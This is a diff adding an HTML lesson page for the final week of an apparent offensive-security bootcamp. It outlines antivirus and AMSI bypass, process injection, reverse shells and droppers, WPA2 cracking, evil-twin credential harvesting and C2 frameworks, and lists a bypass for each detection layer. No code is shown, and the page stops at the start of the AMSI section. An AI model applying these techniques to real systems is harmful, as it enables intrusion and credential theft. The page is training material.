@@ -1,0 +1,1336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Cybersecurity Bootcamp — Phase 3, Week 6 — FINAL</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Major+Mono+Display&family=Syne:wght@400;500;600;700;800&family=Fira+Code:wght@300;400;500;700&display=swap');
+
+:root{
+  --bg:      #040407;
+  --surface: #08090f;
+  --card:    #0c0d18;
+  --border:  #161828;
+  --accent:  #c77dff;   /* neon violet — ghost operator */
+  --bright:  #e0aaff;
+  --cold:    #48bfe3;
+  --lime:    #80ffdb;
+  --crimson: #ff4d6d;
+  --amber:   #ffd166;
+  --ghost:   #9d9db5;
+  --text:    #c4c4d8;
+  --muted:   #363650;
+  --mono:    'Fira Code', monospace;
+  --sans:    'Syne', sans-serif;
+  --display: 'Major Mono Display', monospace;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:15px;line-height:1.7;min-height:100vh;}
+
+/* Signature: slow-moving ghost gradient — diffused violet fog across the page */
+body::before{
+  content:'';position:fixed;inset:0;
+  background:
+    radial-gradient(ellipse 60% 40% at 80% 20%, rgba(199,125,255,0.055) 0%, transparent 70%),
+    radial-gradient(ellipse 40% 50% at 10% 80%, rgba(72,191,227,0.03) 0%, transparent 60%);
+  pointer-events:none;z-index:0;
+}
+
+/* ── HEADER ── */
+header{background:rgba(4,4,7,0.96);border-bottom:1px solid var(--border);padding:0 2rem;position:sticky;top:0;z-index:200;}
+.hi{max-width:1160px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;height:56px;}
+.logo{font-family:var(--display);font-size:0.75rem;letter-spacing:0.05em;color:var(--bright);}
+.wbadge{font-family:var(--mono);font-size:0.6rem;color:var(--accent);border:1px solid rgba(199,125,255,0.3);padding:4px 13px;letter-spacing:0.14em;background:rgba(199,125,255,0.05);}
+
+/* ── HERO ── */
+.hero{max-width:1160px;margin:0 auto;padding:3.5rem 2rem 2.5rem;position:relative;z-index:1;}
+.eyebrow{font-family:var(--mono);font-size:0.63rem;color:var(--muted);letter-spacing:0.28em;margin-bottom:0.9rem;}
+.hero h1{font-family:var(--display);font-size:clamp(1.6rem,4.5vw,3.2rem);color:#fff;line-height:1.15;margin-bottom:1rem;}
+.hero h1 .gl{color:var(--accent);text-shadow:0 0 40px rgba(199,125,255,0.35);}
+.hsub{max-width:580px;color:var(--ghost);font-size:0.9rem;line-height:1.75;margin-bottom:1.8rem;}
+.htags{display:flex;gap:0.5rem;flex-wrap:wrap;}
+.htag{font-family:var(--mono);font-size:0.62rem;padding:4px 11px;border-radius:2px;letter-spacing:0.06em;}
+.ta{background:rgba(199,125,255,0.09);color:var(--accent);border:1px solid rgba(199,125,255,0.25);}
+.tb{background:rgba(72,191,227,0.08);color:var(--cold);border:1px solid rgba(72,191,227,0.2);}
+.tc{background:rgba(128,255,219,0.07);color:var(--lime);border:1px solid rgba(128,255,219,0.18);}
+.td{background:rgba(255,209,102,0.08);color:var(--amber);border:1px solid rgba(255,209,102,0.2);}
+.te{background:rgba(255,77,109,0.08);color:var(--crimson);border:1px solid rgba(255,77,109,0.2);}
+
+/* ── DAY NAV ── */
+.dnav{max-width:1160px;margin:0 auto;padding:0 2rem;display:flex;border-bottom:1px solid var(--border);position:relative;z-index:1;overflow-x:auto;}
+.dtab{font-family:var(--mono);font-size:0.64rem;padding:12px 16px;border:none;background:transparent;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;transition:all 0.16s;white-space:nowrap;letter-spacing:0.04em;}
+.dtab:hover{color:var(--text);}
+.dtab.on{color:var(--accent);border-bottom-color:var(--accent);}
+
+/* ── CONTENT ── */
+.wrap{max-width:1160px;margin:0 auto;padding:2.5rem 2rem;position:relative;z-index:1;}
+.pnl{display:none;}.pnl.on{display:block;}
+
+/* ── DAY HEADER ── */
+.dh{display:flex;gap:1.5rem;align-items:flex-start;margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border);}
+.dnum{font-family:var(--display);font-size:4rem;line-height:0.85;color:var(--accent);opacity:0.1;min-width:95px;}
+.dinfo h2{font-family:var(--sans);font-size:1.3rem;font-weight:800;color:#fff;letter-spacing:0.02em;margin-bottom:0.35rem;}
+.dinfo p{color:var(--ghost);font-size:0.83rem;}
+.stag{font-family:var(--mono);font-size:0.58rem;padding:2px 9px;margin-right:4px;border-radius:2px;letter-spacing:0.08em;}
+.sth{background:rgba(199,125,255,0.09);color:var(--accent);border:1px solid rgba(199,125,255,0.22);}
+.slb{background:rgba(128,255,219,0.07);color:var(--lime);border:1px solid rgba(128,255,219,0.18);}
+.stl{background:rgba(72,191,227,0.07);color:var(--cold);border:1px solid rgba(72,191,227,0.18);}
+
+/* ── PROGRESS ── */
+.pb{margin-bottom:2rem;}
+.pbl{font-family:var(--mono);font-size:0.61rem;color:var(--muted);letter-spacing:0.15em;margin-bottom:5px;}
+.pbt{height:2px;background:var(--border);}
+.pbf{height:100%;background:linear-gradient(90deg,var(--accent),var(--lime));transition:width .5s;}
+
+/* ── CARD ── */
+.card{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:1.5rem;margin-bottom:1.2rem;}
+.clbl{font-family:var(--mono);font-size:0.61rem;color:var(--accent);letter-spacing:0.2em;margin-bottom:0.9rem;display:flex;align-items:center;gap:0.5rem;}
+.clbl::before{content:'▴';font-size:0.5rem;}
+.card h3{font-size:1rem;font-weight:700;color:#e8e0ff;margin-bottom:0.5rem;}
+.card p{color:var(--text);font-size:0.87rem;margin-bottom:0.5rem;}
+.card p:last-child{margin-bottom:0;}
+
+/* ── TERMINAL ── */
+.trm{background:#010208;border:1px solid var(--border);border-radius:4px;overflow:hidden;margin:1rem 0;}
+.tbar{background:#06060f;padding:7px 14px;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--border);}
+.d{width:9px;height:9px;border-radius:50%;}
+.dr{background:#ff5f56;}.dy{background:#ffbd2e;}.dg{background:#27c93f;}
+.ttl{font-family:var(--mono);font-size:0.61rem;color:var(--muted);margin-left:6px;letter-spacing:0.1em;}
+.tbody{padding:1.2rem 1.4rem;font-family:var(--mono);font-size:0.76rem;line-height:2.1;color:#2a2a45;}
+.pr{color:var(--lime);}.cm{color:#d0c8f0;}.co{color:#1a1a30;}
+.ha{color:var(--accent);}.hc{color:var(--crimson);}.ham{color:var(--amber);}
+.hl2{color:var(--lime);}.hb{color:var(--cold);}.hg{color:var(--ghost);}
+
+/* ── TABLE ── */
+.tbl{width:100%;border-collapse:collapse;font-size:0.8rem;margin:1rem 0;}
+.tbl th{background:var(--surface);color:var(--cold);font-family:var(--mono);font-size:0.61rem;letter-spacing:0.14em;text-align:left;padding:9px 13px;border:1px solid var(--border);}
+.tbl td{padding:9px 13px;border:1px solid var(--border);color:var(--text);vertical-align:top;}
+.tbl tr:nth-child(even) td{background:rgba(255,255,255,0.013);}
+.tbl tr:hover td{background:rgba(199,125,255,0.03);}
+
+/* ── CALLOUT ── */
+.note{display:flex;gap:1rem;align-items:flex-start;padding:1rem 1.2rem;border-radius:3px;margin:1rem 0;font-size:0.84rem;}
+.ni{background:rgba(72,191,227,0.06);border:1px solid rgba(72,191,227,0.18);}
+.nw{background:rgba(255,209,102,0.06);border:1px solid rgba(255,209,102,0.2);}
+.nd{background:rgba(255,77,109,0.06);border:1px solid rgba(255,77,109,0.2);}
+.ng{background:rgba(128,255,219,0.05);border:1px solid rgba(128,255,219,0.17);}
+.nv{background:rgba(199,125,255,0.06);border:1px solid rgba(199,125,255,0.2);}
+.nico{font-size:1rem;line-height:1.6;flex-shrink:0;}
+.note p{color:var(--text);margin:0;}.note strong{color:#fff;}
+
+/* ── CHECKLIST ── */
+.ck{list-style:none;margin:0.8rem 0;}
+.ck li{display:flex;align-items:flex-start;gap:0.7rem;padding:0.42rem 0;font-size:0.85rem;color:var(--text);border-bottom:1px solid rgba(255,255,255,0.04);}
+.ck li:last-child{border-bottom:none;}
+.ck li::before{content:'—';color:var(--accent);flex-shrink:0;font-family:var(--mono);}
+
+/* ── QUIZ ── */
+.qb{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:1.4rem;margin-bottom:1rem;}
+.qt{font-size:0.88rem;font-weight:600;color:#e8e0ff;margin-bottom:1rem;}
+.qopts{display:flex;flex-direction:column;gap:0.44rem;}
+.qo{display:flex;align-items:flex-start;gap:0.65rem;padding:0.6rem 1rem;border:1px solid var(--border);border-radius:2px;cursor:pointer;font-size:0.8rem;color:var(--text);transition:all 0.14s;user-select:none;}
+.qo:hover{border-color:var(--accent);color:#fff;background:rgba(199,125,255,0.04);}
+.qo.correct{border-color:var(--lime);background:rgba(128,255,219,0.07);color:var(--lime);}
+.qo.wrong{border-color:var(--crimson);background:rgba(255,77,109,0.07);color:var(--crimson);}
+.qk{font-family:var(--mono);font-size:0.66rem;color:var(--muted);min-width:16px;flex-shrink:0;padding-top:1px;}
+.qfb{margin-top:0.8rem;font-size:0.78rem;padding:0.6rem 1rem;border-radius:2px;display:none;}
+.qfb.show{display:block;}
+.qfb.correct{background:rgba(128,255,219,0.08);color:var(--lime);border:1px solid rgba(128,255,219,0.22);}
+.qfb.wrong{background:rgba(255,77,109,0.08);color:var(--crimson);border:1px solid rgba(255,77,109,0.22);}
+
+/* ── AV EVASION LAYERS ── */
+.evasion-stack{display:flex;flex-direction:column;gap:3px;margin:1rem 0;}
+.ev-layer{display:grid;grid-template-columns:44px 1fr 1fr;gap:0;border-radius:3px;overflow:hidden;cursor:default;transition:transform .15s;}
+.ev-layer:hover{transform:translateX(5px);}
+.el-num{font-family:var(--mono);font-size:0.75rem;font-weight:700;display:flex;align-items:center;justify-content:center;padding:10px;}
+.el-name{font-family:var(--sans);font-size:0.85rem;font-weight:700;display:flex;align-items:center;padding:10px 14px;border-left:1px solid rgba(255,255,255,0.05);}
+.el-desc{font-size:0.78rem;color:rgba(255,255,255,0.55);display:flex;align-items:center;padding:10px 14px;border-left:1px solid rgba(255,255,255,0.05);}
+.ev1{background:linear-gradient(90deg,#0f0a1a,#1a0f2e);}.ev1 .el-num{background:#4a1080;color:#fff;}
+.ev2{background:linear-gradient(90deg,#0a0f1a,#0f1a2e);}.ev2 .el-num{background:#0a3080;color:#fff;}
+.ev3{background:linear-gradient(90deg,#0a1a16,#0f2e24);}.ev3 .el-num{background:#0a5030;color:#fff;}
+.ev4{background:linear-gradient(90deg,#1a140a,#2e220f);}.ev4 .el-num{background:#604010;color:#fff;}
+.ev5{background:linear-gradient(90deg,#1a0a0a,#2e0f0f);}.ev5 .el-num{background:#801010;color:#fff;}
+.ev-bypass{font-family:var(--mono);font-size:0.62rem;color:var(--amber);background:rgba(255,209,102,0.08);border:1px solid rgba(255,209,102,0.2);border-radius:2px;padding:2px 7px;margin-left:0.4rem;}
+
+/* ── C2 FRAMEWORK COMPARISON ── */
+.c2-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:0.9rem;margin:1rem 0;}
+.c2-card{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1.2rem;position:relative;overflow:hidden;}
+.c2-card::after{content:'';position:absolute;top:0;right:0;width:3px;height:100%;}
+.c2-card.sliver::after{background:var(--lime);}
+.c2-card.havoc::after{background:var(--crimson);}
+.c2-card.cs::after{background:var(--amber);}
+.c2-card.empire::after{background:var(--cold);}
+.c2-card.cov::after{background:var(--accent);}
+.c2-name{font-family:var(--mono);font-size:0.9rem;font-weight:700;margin-bottom:0.2rem;}
+.c2-card.sliver .c2-name{color:var(--lime);}
+.c2-card.havoc .c2-name{color:var(--crimson);}
+.c2-card.cs .c2-name{color:var(--amber);}
+.c2-card.empire .c2-name{color:var(--cold);}
+.c2-card.cov .c2-name{color:var(--accent);}
+.c2-meta{font-family:var(--mono);font-size:0.63rem;color:var(--muted);margin-bottom:0.6rem;}
+.c2-desc{font-size:0.8rem;color:var(--ghost);margin-bottom:0.6rem;line-height:1.55;}
+.c2-feat{font-size:0.77rem;color:var(--text);}
+
+/* ── WIRELESS ATTACK FLOW ── */
+.wflow{display:flex;flex-direction:column;gap:0;border:1px solid var(--border);border-radius:3px;overflow:hidden;margin:1rem 0;}
+.wstep{display:grid;grid-template-columns:44px 1fr;border-bottom:1px solid var(--border);}
+.wstep:last-child{border-bottom:none;}
+.ws-n{background:var(--surface);font-family:var(--display);font-size:0.9rem;color:var(--accent);display:flex;align-items:center;justify-content:center;border-right:1px solid var(--border);}
+.ws-b{padding:11px 14px;}
+.ws-title{font-weight:700;font-size:0.88rem;color:#e8e0ff;margin-bottom:0.25rem;}
+.ws-desc{font-size:0.81rem;color:var(--ghost);}
+.ws-cmd{font-family:var(--mono);font-size:0.72rem;color:var(--lime);margin-top:0.4rem;background:rgba(128,255,219,0.05);border:1px solid rgba(128,255,219,0.12);padding:3px 8px;border-radius:2px;display:inline-block;word-break:break-all;}
+
+/* ── REPORT TEMPLATE ── */
+.report-sections{display:flex;flex-direction:column;gap:0.5rem;margin:1rem 0;}
+.rs{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1rem 1.2rem;display:grid;grid-template-columns:180px 1fr;gap:0.8rem;align-items:start;}
+.rs-label{font-family:var(--mono);font-size:0.71rem;color:var(--accent);letter-spacing:0.08em;}
+.rs-desc{font-size:0.83rem;color:var(--text);}
+
+/* ── ROADMAP TIMELINE ── */
+.timeline{position:relative;margin:1.5rem 0;padding-left:2rem;}
+.timeline::before{content:'';position:absolute;left:8px;top:0;bottom:0;width:1px;background:linear-gradient(to bottom,var(--accent),var(--lime));}
+.tl-item{position:relative;margin-bottom:1.5rem;padding-left:1.2rem;}
+.tl-item::before{content:'';position:absolute;left:-1.77rem;top:6px;width:10px;height:10px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);}
+.tl-item:last-child{margin-bottom:0;}
+.tl-period{font-family:var(--mono);font-size:0.66rem;color:var(--accent);letter-spacing:0.12em;margin-bottom:0.3rem;}
+.tl-title{font-weight:700;font-size:0.95rem;color:#fff;margin-bottom:0.3rem;}
+.tl-desc{font-size:0.83rem;color:var(--ghost);}
+
+/* ── CERT CARDS ── */
+.cert-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:0.9rem;margin:1rem 0;}
+.cert-card{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1.2rem;}
+.cert-name{font-family:var(--sans);font-weight:800;font-size:0.95rem;color:#e8e0ff;margin-bottom:0.2rem;}
+.cert-issuer{font-family:var(--mono);font-size:0.63rem;color:var(--muted);margin-bottom:0.5rem;}
+.cert-desc{font-size:0.79rem;color:var(--ghost);margin-bottom:0.7rem;}
+.cert-diff{font-family:var(--mono);font-size:0.63rem;padding:3px 9px;border-radius:2px;display:inline-block;}
+.d-entry{background:rgba(128,255,219,0.08);color:var(--lime);border:1px solid rgba(128,255,219,0.2);}
+.d-inter{background:rgba(255,209,102,0.08);color:var(--amber);border:1px solid rgba(255,209,102,0.2);}
+.d-adv{background:rgba(255,77,109,0.08);color:var(--crimson);border:1px solid rgba(255,77,109,0.2);}
+.d-elite{background:rgba(199,125,255,0.1);color:var(--accent);border:1px solid rgba(199,125,255,0.25);}
+
+/* ── SECTION LABEL ── */
+.slbl{font-family:var(--mono);font-size:0.61rem;color:var(--muted);letter-spacing:0.25em;margin:2rem 0 0.8rem;}
+
+/* ── TWO / THREE COL ── */
+.two{display:grid;grid-template-columns:1fr 1fr;gap:1rem;}
+.three{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem;}
+@media(max-width:700px){.two,.three{grid-template-columns:1fr;}.dnum{font-size:2.8rem;min-width:70px;}.ev-layer{grid-template-columns:40px 1fr;}.el-desc{display:none;}.rs{grid-template-columns:1fr;}}
+
+/* ── HELPERS ── */
+.hl{color:var(--accent);font-weight:600;}
+.hcr{color:var(--crimson);font-weight:600;}
+.ham2{color:var(--amber);font-weight:600;}
+.hlm{color:var(--lime);font-weight:600;}
+.hbl{color:var(--cold);font-weight:600;}
+.hgh{color:var(--ghost);font-weight:600;}
+
+/* ── CAPSTONE GLOW ── */
+.capstone-hero{
+  border:1px solid rgba(199,125,255,0.3);
+  border-radius:4px;padding:2rem;margin:1rem 0;
+  background:linear-gradient(135deg,rgba(199,125,255,0.06) 0%,rgba(128,255,219,0.03) 100%);
+  text-align:center;
+}
+.cap-title{font-family:var(--display);font-size:clamp(1.2rem,3vw,2rem);color:var(--bright);margin-bottom:0.8rem;}
+.cap-sub{font-size:0.88rem;color:var(--ghost);max-width:500px;margin:0 auto 1.5rem;}
+
+/* ── FOOTER ── */
+footer{border-top:1px solid var(--border);padding:1.5rem 2rem;text-align:center;font-family:var(--mono);font-size:0.63rem;color:var(--muted);letter-spacing:0.1em;max-width:1160px;margin:2rem auto 0;position:relative;z-index:1;}
+</style>
+<link rel="stylesheet" href="../css/shared.css"/>
+</head>
+<body>
+<nav class="breadcrumb" style="background:var(--surface,#090c12);border-bottom-color:var(--border,#141b26);color:var(--muted,#253040);">
+  <a href="../index.html" style="color:var(--accent,#3b82f6);">LESSON HUB</a>
+  <span>/</span>
+  <span style="color:var(--text,#b0c0d8);">Phase 3</span>
+  <span>/</span>
+  <span style="color:#fff;">Week 6</span>
+</nav>
+
+<header>
+  <div class="hi">
+    <div class="logo">cyberbootcamp // phase 3 // final</div>
+    <div class="wbadge">WEEK 6 · RED TEAM · AV EVASION · C2 · WIRELESS</div>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="eyebrow">// phase 3 — advanced offensive security → week 6 of 6 → bootcamp final</div>
+  <h1>Operate<br>like a<br><span class="gl">ghost.</span></h1>
+  <p class="hsub">The final week. AV evasion to survive modern defenses, C2 framework infrastructure, custom payload development, wireless attack chains, purple team methodology, and a professional pentest report. Then — the full 2-month retrospective and your path forward.</p>
+  <div class="htags">
+    <span class="htag ta">AV Evasion</span>
+    <span class="htag tb">AMSI Bypass</span>
+    <span class="htag tc">Sliver C2</span>
+    <span class="htag td">Custom Payloads</span>
+    <span class="htag te">Wireless Attacks</span>
+    <span class="htag ta">Purple Team</span>
+    <span class="htag tb">Report Writing</span>
+    <span class="htag tc">2-Month Capstone</span>
+  </div>
+</div>
+
+<!-- ── WEEK 6 OUTLINE ── -->
+<div style="max-width:1160px;margin:0 auto;padding:0 2rem 2rem;position:relative;z-index:1;">
+  <div style="background:var(--card);border:1px solid var(--border);border-radius:4px;overflow:hidden;">
+    <div style="background:var(--surface);padding:0.9rem 1.4rem;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:0.6rem;">
+      <span style="font-family:var(--mono);font-size:0.62rem;color:var(--accent);letter-spacing:0.2em;">WEEK 6 — DAILY OUTLINE</span>
+      <span style="font-family:var(--mono);font-size:0.6rem;color:var(--muted);margin-left:auto;">PHASE 3 · DAYS 36–42 · FINAL WEEK</span>
+    </div>
+    <table style="width:100%;border-collapse:collapse;font-size:0.82rem;">
+      <thead>
+        <tr>
+          <th style="background:var(--surface);color:var(--cold);font-family:var(--mono);font-size:0.6rem;letter-spacing:0.14em;text-align:left;padding:9px 14px;border:1px solid var(--border);width:80px;">DAY</th>
+          <th style="background:var(--surface);color:var(--cold);font-family:var(--mono);font-size:0.6rem;letter-spacing:0.14em;text-align:left;padding:9px 14px;border:1px solid var(--border);width:210px;">TOPIC</th>
+          <th style="background:var(--surface);color:var(--cold);font-family:var(--mono);font-size:0.6rem;letter-spacing:0.14em;text-align:left;padding:9px 14px;border:1px solid var(--border);">WHAT YOU'LL LEARN</th>
+          <th style="background:var(--surface);color:var(--cold);font-family:var(--mono);font-size:0.6rem;letter-spacing:0.14em;text-align:left;padding:9px 14px;border:1px solid var(--border);width:180px;">KEY TOOLS</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 36</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#e8e0ff;font-weight:600;">Antivirus Evasion</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">The 5-layer AV detection stack (signatures → heuristics → AMSI → behavioral → ML) with a bypass technique for each layer. AMSI bypass: memory patching amsi.dll, string concatenation, PowerShell v2 downgrade, Invoke-Obfuscation. Process injection: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread pattern. Msfvenom encoding and embedding payloads inside legitimate executables. Never upload test payloads to VirusTotal.</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">msfvenom, Invoke-Obfuscation, Evil-WinRM Bypass-4MSI</td>
+        </tr>
+        <tr style="background:rgba(255,255,255,0.013);">
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 37</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#e8e0ff;font-weight:600;">Custom Payload Development</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">Why custom payloads evade AV — no signatures for novel code. Build reverse shells from scratch in Python (socket + subprocess), PowerShell one-liner, Bash /dev/tcp, and C# (TcpClient). Two-stage dropper pattern: small clean stager downloads full payload in memory over HTTPS. Set up your own HTTPS payload server with self-signed cert. HTA and Office macro dropper concepts. ExecutionPolicy bypass without admin rights via -EncodedCommand.</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">Python, C#, msfvenom, openssl, netcat</td>
+        </tr>
+        <tr>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 38</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#e8e0ff;font-weight:600;">Advanced Web App Security</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">JWT attack chain: decode structure, alg:none bypass, weak secret cracking with Hashcat mode 16500, RS256→HS256 algorithm confusion, JWK header injection. GraphQL: introspection to dump full schema, querying hidden sensitive fields (SSN, credit cards), batch query attack to bypass rate limiting, clairvoyance for schema recovery without introspection. Race conditions: check-then-act timing flaws exploited with Burp Turbo Intruder — coupon reuse, double-spend bank transfers, OTP reuse.</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">Burp Suite, Turbo Intruder, hashcat, jwt_tool, graphw00f</td>
+        </tr>
+        <tr style="background:rgba(255,255,255,0.013);">
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 39</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#e8e0ff;font-weight:600;">Wireless Security</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">Full WPA2 attack chain in 6 steps: monitor mode → network survey → targeted capture → deauthentication attack to force handshake → offline crack with Hashcat mode 22000. PMKID attack — capture crackable material directly from AP beacon without waiting for any client. Evil twin attack: rogue AP with identical SSID, hostapd + dnsmasq setup, captive portal credential harvesting, SSLstrip for non-HSTS sites. Automated evil twin with Wifiphisher. Hardware requirements (Alfa adapter).</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">aircrack-ng suite, hashcat, hcxdumptool, Wifiphisher, hostapd</td>
+        </tr>
+        <tr>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 40</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#e8e0ff;font-weight:600;">C2 Frameworks</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">Why Meterpreter is insufficient for mature environments. Five C2 frameworks compared: Sliver (free, Go, mTLS), Havoc (free, GUI, EDR evasion), Cobalt Strike (commercial gold standard), Empire/Starkiller (PowerShell focus), Covenant/Brute Ratel. Full Sliver walkthrough: install server, start HTTPS listener, generate implant, receive session, key commands (shell, migrate, upload, execute-assembly). OPSEC: sleep jitter to break beacon detection patterns, malleable profiles to blend into normal traffic.</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">Sliver, Havoc, Empire, CobaltStrike (concept)</td>
+        </tr>
+        <tr style="background:rgba(255,255,255,0.013);">
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 41</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#e8e0ff;font-weight:600;">Professional Report Writing</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">The 8-section report structure (cover → executive summary → scope → risk dashboard → findings → attack narrative → remediation roadmap → appendices). Writing for two audiences: non-technical executives and technical staff simultaneously. Individual finding template with CVSS scoring, evidence screenshots, business impact, and tiered remediation steps — demonstrated with a complete SQL injection finding example. Real-time evidence collection discipline. Note-taking tools: Obsidian, CherryTree, Ghostwriter, script terminal logging. How to respond to client pushback on attack chain realism.</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">Obsidian, CherryTree, Ghostwriter, PlexTrac</td>
+        </tr>
+        <tr>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 42</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#e8e0ff;font-weight:600;">2-Month Capstone & Path Forward</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">Complete 2-month skill map across all 4 phases. 8 certification roadmap with difficulty ratings: Security+ and eJPT (entry), PNPT and CEH (intermediate), OSCP and BTL1 (advanced), CRTO, OSEP/OSED/OSWE (elite). 5-stage career timeline: months 1–3 lab consolidation, months 3–5 eJPT→PNPT, months 5–9 bug bounty + OSCP prep, months 9–12 OSCP + first job, year 2+ specialization. Three capstone lab tracks: full AD compromise simulation with MITRE ATT&CK mapping, purple team exercise (attack → build detection), HackTheBox Pro Labs or PNPT prep. Communities, staying-current resources, and practice platforms.</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">HackTheBox, TryHackMe, PortSwigger Academy, VulnHub</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<div class="dnav">
+  <button class="dtab on"  onclick="show(0)">Day 36 — AV Evasion</button>
+  <button class="dtab" onclick="show(1)">Day 37 — Custom Payloads</button>
+  <button class="dtab" onclick="show(2)">Day 38 — Web App Advanced</button>
+  <button class="dtab" onclick="show(3)">Day 39 — Wireless Security</button>
+  <button class="dtab" onclick="show(4)">Day 40 — C2 Frameworks</button>
+  <button class="dtab" onclick="show(5)">Day 41 — Report Writing</button>
+  <button class="dtab" onclick="show(6)">Day 42 — 2-Month Capstone</button>
+</div>
+
+<div class="wrap">
+
+<!-- ═══════════ DAY 36 ═══════════ -->
+<div class="pnl on" id="p0">
+  <div class="dh">
+    <div class="dnum">36</div>
+    <div class="dinfo">
+      <h2>Antivirus Evasion</h2>
+      <p><span class="stag sth">THEORY</span><span class="stag slb">LAB</span> Shellcode Encoding · Process Injection · AMSI Bypass · Obfuscation</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 6 PROGRESS — DAY 36 OF 42</div><div class="pbt"><div class="pbf" style="width:86%"></div></div></div>
+
+  <div class="note nv">
+    <div class="nico">👻</div>
+    <p><strong>Your best exploit is useless if Windows Defender deletes it in 2 seconds.</strong> Modern AV products use static signature detection, heuristic analysis, behavioral monitoring, and machine learning. AV evasion is the art of making malicious code look benign to each of these layers. A red teamer who can't evade AV is limited to undefended environments — which don't exist in real engagements.</p>
+  </div>
+
+  <div class="slbl">// 36.1 — THE AV DETECTION STACK</div>
+  <div class="evasion-stack">
+    <div class="ev-layer ev1">
+      <div class="el-num">5</div>
+      <div class="el-name">ML / Cloud</div>
+      <div class="el-desc">Behavioral telemetry sent to cloud AI — detects novel threats. Bypass: slow staging, legitimate-looking behavior patterns. <span class="ev-bypass">Hardest</span></div>
+    </div>
+    <div class="ev-layer ev2">
+      <div class="el-num">4</div>
+      <div class="el-name">Behavioral / EDR</div>
+      <div class="el-desc">Monitors process creation, API calls, network connections. Bypass: process hollowing, parent PID spoofing, sleep obfuscation. <span class="ev-bypass">Hard</span></div>
+    </div>
+    <div class="ev-layer ev3">
+      <div class="el-num">3</div>
+      <div class="el-name">AMSI (Script)</div>
+      <div class="el-desc">Scans PowerShell/VBScript before execution. Bypass: patch amsi.dll in memory, string obfuscation, concatenation. <span class="ev-bypass">Medium</span></div>
+    </div>
+    <div class="ev-layer ev4">
+      <div class="el-num">2</div>
+      <div class="el-name">Heuristic Analysis</div>
+      <div class="el-desc">Looks for suspicious patterns: VirtualAlloc + WriteProcessMemory + CreateThread = shellcode loader. Bypass: indirect syscalls, API unhooking. <span class="ev-bypass">Medium</span></div>
+    </div>
+    <div class="ev-layer ev5">
+      <div class="el-num">1</div>
+      <div class="el-name">Static Signatures</div>
+      <div class="el-desc">Hash-based and string-based matching against known malware patterns. Bypass: encoding, encryption, custom compilers, string obfuscation. <span class="ev-bypass">Easiest</span></div>
+    </div>
+  </div>
+
+  <div class="slbl">// 36.2 — AMSI BYPASS (ANTIMALWARE SCAN INTERFACE)</div>
+  <div class="card">
+    <div class="clbl">WHAT AMSI IS</div>
